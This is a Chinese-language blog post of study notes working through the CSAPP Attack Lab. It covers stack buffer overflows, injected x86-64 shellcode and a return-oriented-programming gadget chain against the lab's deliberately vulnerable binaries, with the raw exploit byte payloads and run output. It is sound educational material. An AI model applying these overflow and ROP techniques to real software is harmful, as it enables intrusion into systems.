---
title: CSAPP Attack Lab 笔记
date: 2024-12-29 21:53:00
tags: 组成原理 CSAPP cmu15213 笔记
categories: 组成原理
---

## Phase 0x1

一个练手的，要求通过缓冲区栈溢出攻击来调用 touch1

`gdb ctarget` 然后 `set args -q` 防止与不存在的服务器通信（`run -q` 也可以)
`b Gets` `run -q`

看一下栈信息: 

```
────────────────────────[ STACK ]────────────────────────
00:0000│ rsp 0x5561dc70 —▸ 0x4017b4 (getbuf+12) ◂— movl $1, %eax
01:0008│ rdi 0x5561dc78 ◂— 0
... ↓        3 skipped
05:0028│     0x5561dc98 —▸ 0x55586000 ◂— 0
06:0030│     0x5561dca0 —▸ 0x401976 (test+14) ◂— movl %eax, %edx
07:0038│     0x5561dca8 —▸ 0x55685fe8 —▸ 0x402fa5 ◂— pushq $0x3a6971 /* 'hqi:' */
```

rsp 是当前栈顶指针，由于是在 Gets 的开头查看的，所以栈顶存的就是 Gets 的返回地址

思路应该是覆盖栈顶指针 `0x5561dc70` 处的
正确返回地址为 `touch1` 的地址`0x4017c0`

如何覆盖？看一下读入字符串的逻辑：

`_IO_getc@plt` 很明显是库函数 getchar()   
那附近是一个循环，如果是 -1 (`0x7ffffffff`) 就跳出，  
如果不是 0xA (经查表这个就是 ASCII 的行分隔符）就读入下一个 char

那就看一下读入单个字符的逻辑   
$rbx = $rdi, 推测 $rdi 作为 Gets() 的第一个参数就是存到的字符串地址   
也就是说 (%rdi) 应该就是我们输入的字符串存储地址的第一位
当然这里因为要调用 `_IO_getc` 并且 rdi 是调用者保存寄存器  
所以先用 rbx 存一下 rdi 

看了下 Gets 的 $rdi 存的是 `0x5561dc78`    
发现其实缓冲区不在 Gets() 的栈帧里(78 > 70, 栈内存向低地址增长）...

重新观察 `getbuf` 的汇编代码，发现 `sub $0x28, %rsp`，分配了 40 字节的缓冲区   
由于缓冲区栈溢出攻击的原理大概是这样：

```
// 注意这个栈是从高地址向低地址增加的

+------------------------+ 高地址
| caller 返回地址        | <- 函数返回时跳转的位置 0x5561dca0
+------------------------+
| buffer[40]             | <- callee 的栈帧
| buffer[39]             |
| ...                    | <- 缓冲区
| buffer[1]              |
| buffer[0]              | <- 缓冲区起始           0x5561dc78
+------------------------+ 低地址
```

所以只能向相对缓冲区更高的地址溢出，于是换个思路，在 getbuf 处 ret 到 `touch1()`   
所以就不用考虑 Gets 的细节了，一共 40 字节的 buffer, 直接填充 40 个 `00`，  
然后填充 `c0 17 40` 即可(gdb 中在 getbuf 起始处看 %rsp 也能发现就是 `0x5561dca0 = 0x5561dc78 + 0x28` )

```
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
c0 17 40
```

一个地址对应的通常是一字节，而一个十六进制的每个位数是 4 个二进制位 (1111=15=f)

两个十六进制位就是一字节。

由于只有网络协议相关会用大端法，所以这里是小端法，地址小的位置存的是低位

至于 `hex2raw` (Hexadecimal to Raw), 其实就是 `echo -n -e "\xc0\x17\x40"` 

## Phase 0x2

要求将 `cookie.txt` 作为参数传递给 `touch2()` 并调用

至此调用函数我们已经非常熟悉了，直接填充对应函数的地址到溢出后的位置即可。   
但是我们还需要传递参数，所以就不能再填充 `00` 了。   
这个 `ctarget` 编译时是关闭栈保护的，也就是说栈内存上的代码可以直接被执行。

编写 `phase2_inject.asm`:

```asm
mov      $0x59b997fa, %rdi
pushq    $0x4017ec
ret
```

其中，`0x59b997fa` 是 cookie，`0x4017ec` 是 `touch2()` 的地址。    
当然这个是 AT&T 的语法，`nasm` 默认似乎是 Intel，所以我用 `as`

```shell
$ as phase2_inject.asm
$ objdump -d a.out

a.out:     file format elf64-x86-64


Disassembly of section .text:

0000000000000000 <.text>:
   0:   48 c7 c7 fa 97 b9 59    mov    $0x59b997fa,%rdi
   7:   68 ec 17 40 00          push   $0x4017ec
   c:   c3
```

于是得到了我们的 `inraw.txt`

```
48 c7 c7 fa 97 b9 59 90 
68 ec 17 40 00 90 90 90 
c3 00 00 00 00 00 00 00 
90 90 90 90 90 90 90 90 
90 90 90 90 90 90 90 90 
78 dc 61 55 00 00 00 00
```

这里 90 是 `nop`, 用于填充的，不过似乎不需要?   
返回地址也直接覆盖为 `0x5561dc78`， 缓冲区开始的地方，也就是我们注入代码开始的地方   
还是要注意小端法。

(用时最短的一个，第一个做完第二个就轻车熟路了)

## Phase 0x3

查看 `attack.pdf` 的要求，发现主要是把 cookie 十六进制对应的字符串 ( $without\ a\ leading\ $ `0x` ), 然后用 `hexmatch` 比较是否相等。

但是这个 `hexmatch` 写得太折磨了。

```c
int hexmatch(unsigned val, char * sval) {
    char cbuf[110];
    char *s = cbuf + random() % 100;
    sprintf(s, "%.8x", sval);
    return strncmp(sval, s, 9) == 0;
}
```

这个 110 大小的缓冲区 `cbuf` 会把我们 inject code 和 cookie string 所在的缓冲区弄得一团糟，而且 random 的存在导致我们不能直接填充这个地址。

解决方案有点取巧。在 gdb 中打断点，分别在 `touch3()`  起始和`hexmatch()` 后检查缓冲区 `x/100bx 0x556178` ，找到前后没变并且~~看起来~~没什么用的区域填充 cookie。

```textile
48 c7 c7 b3 dc 61 55 90 
68 fa 18 40 00 90 90 90 
c3 90 90 90 90 90 90 90 
90 90 90 90 90 90 90 90 
90 90 90 90 90 90 90 90 
78 dc 61 55 00 00 00 00 
90 90 90 90 90 90 90 90
90 90 90 35 39 62 39 39 
37 66 61 00 90 90 90 90 
```

这里 `0x5561dcb3` 及之后是 cookie。 (注意结尾 `\0` )

```
.. .. .. 35 39 62 39 39 
37 66 61 00 .. .. .. ..
```

完美通过。

```shell
amiriox@makinohara ‹ master ●● › : ~/csapplab/attacklab
[] ξ ./hex2raw < inraw.txt > in.txt && ./ctarget -q < in.txt
Cookie: 0x59b997fa
Type string:Touch3!: You called touch3("59b997fa")
Valid solution for level 3 with target ctarget
PASS: Would have posted the following:
    user id    bovik
    course    15213-f15
    lab    attacklab
    result    1:PASS:0xffffffff:ctarget:3:48 C7 C7 B3 DC 61 55 90 68 FA 18 40 00 90 90 90 C3 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 78 DC 61 55 00 00 00 00 90 90 90 90 90 90 90 90 90 90 90 35 39 62 39 39 37 66 61 00 90 90 90 90 
```

## Phase 0x4

`attack.pdf` 中介绍了关于 `ROP` 的相关知识.

因此推测思路是，通过缓冲区溢出攻击在栈顶放 cookie,     
通过 `popq %rdi` 恢复到 %rdi 寄存器以传参,   
然后 `call 0x4017ec` (`touch2()`).    
但是 gadgets farm 中没有出现 call 的 gadget, 所以只能用 `ret` 转移到 `touch2()`,     
这样就要保证 `popq` 弹栈恢复 %rdi 之后的栈顶是 `0x4017ec`.

* `popq %rdi` 的机器码是 `5f`
* `ret` 的机器码是 `c3`
* 需要用 `nop` 即 `90` 对齐

有两个问题需要考虑:
1. 前几个 phase 是上周做的了，这几天一直在复习高数，所以栈的布局还得再研究一下
2. 怎么执行到第一个 gadget ? 第一个 gadget `ret` 后，会通过 ret 弹出栈顶的地址并跳转到那个地址实现链式调用.

solve:
1. 返回地址在栈上的位置是 `0x5561dca0` = `0x5561dc78` + `0x28`
2. 第一个 gadget 大概直接在 `0x5561dca0` 写地址就行，栈保护是没事的因为 gadget 不在栈内存，但是地址随机化不好说。

紧接着发现 gadget farm 里没有 `5f`, 感觉很不解, 这么精妙的做法, 这 lab 不这么解说明教授水平不行啊。   
`attacklab.pdf` 说只需要两条指令就能做 phase 4, 但是调用 touch2 的 ret 肯定需要一条， 剩下的除了 `popq` 还能是什么?

谔谔, 卡了半天决定去看 [Arthals 在北大计算机系统导论（ICS）课程中所做的详尽笔记](https://arthals.ink/blog/attack-lab)     
这个 lab 是北京大学改过的(甚至还买了 csapp 的版权, 9 爷吃的就是好啊)。   
然后发现他们也没给 `5f`, 那我估计就是先 `pop` 再 `mov`, ugly.

重新审阅 `rtarget.asm` 中 `start_farm` 到 `mid_farm` 之间的机器码, 发现有 `58` 即 `popq %rax`    
则我们需要

```asm
popq    %rax;       ret   # 58 90 c3 at 0x4019cc
movl/q  %rax, %rdi; ret   # 48 89 c7 at 0x4019a2
```

填充 `inraw.txt`, 当然传递给 `hex2raw` 的是不能有注释的.

```
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 
cc 19 40 00 00 00 00 00 # 缓冲区溢出的返回地址, 这里 ROP 直接进第一个 gadget = popq %rax; ret
fa 97 b9 59 00 00 00 00 # cookie
a2 19 40 00 00 00 00 00 # movq %rax, %rdi; ret
ec 17 40 00 00 00 00 00 # touch2() 的地址
```

栈中的情况和具体执行流程:

```
+---------------------------+ 高地址
| touch2() 的地址           | <- 由第二个 gadget movq ret 而来.
| movq %rax, %rdi; ret      | <- 由第一个 gadget popq ret 而来, 所谓 gadget 的链式调用。
+---------------------------+
| cookie,被popq弹出,放入rax | <- 缓冲区溢出时地址累加, 但栈向低地址扩张 
| popq %rax; ret            | <- 函数返回时跳转的位置, 弹出 cookie 后栈顶是 movq， 于是 ret 到那里
+---------------------------+
| buffer[40]                | <- callee 的栈帧
| buffer[39]                |
| ... 我们填了40 字节的0    | <- 缓冲区
| buffer[1]                 |
| buffer[0]                 | <- 缓冲区起始           0x5561dc78
+---------------------------+ 低地址

```

~~其实这里直接过了我不太理解的, 为什么不需要保持 rsp 16 位对齐啊?~~

这里没有发生段错误而是直接栈对齐了是因为恰好两次 ret, 每次 +8,   
然后调用 touch2 时满足了 rsp 16 位对齐。

说是普通的运算不需要一直保持 `rsp % 16 == 0`, 只需要在函数调用时满足就可以了, 具体还有待后续学习.

```shell
amiriox@makinohara ‹ master ●● › : ~/csapplab/attacklab
[1] ξ ./hex2raw < inraw.txt > in.txt && ./rtarget -q < in.txt
Cookie: 0x59b997fa
Type string:Misfire: You called touch2(0x3928c8e0)
Ouch!: You caused a segmentation fault!
Better luck next time
FAIL: Would have posted the following:
	user id	bovik
	course	15213-f15
	lab	attacklab
	result	1:FAIL:0xffffffff:rtarget:0:9E 19 40 00 00 00 00 00 CC 19 40 00 00 00 00 00 FA 97 B9 59 00 00 00 00 A2 19 40 00 00 00 00 00 9E 19 40 00 00 00 00 00 EC 17 40 00 00 00 00 00 
```
